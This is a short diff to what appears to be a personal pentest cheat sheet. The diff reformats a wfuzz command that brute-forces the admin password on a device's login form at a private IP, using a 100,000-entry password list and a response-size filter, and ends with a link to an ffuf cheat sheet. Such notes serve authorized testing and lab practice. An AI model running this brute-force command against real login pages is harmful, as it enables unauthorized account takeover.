@@ -59,9 +59,9 @@ wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100
 ```
 you can restrict file size of th erequest to remove erronious responses 
 
-```wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404  -d "Login=admin&Password=FUZZ" --hh 229 http://192.168.233.45:80/goform/formLogin
+```
+wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404  -d "Login=admin&Password=FUZZ" --hh 229 http://192.168.233.45:80/goform/formLogin
 ```
 
 
 https://www.phrack.me/tools/2022/07/06/Ffuf-cheatsheet.html
-
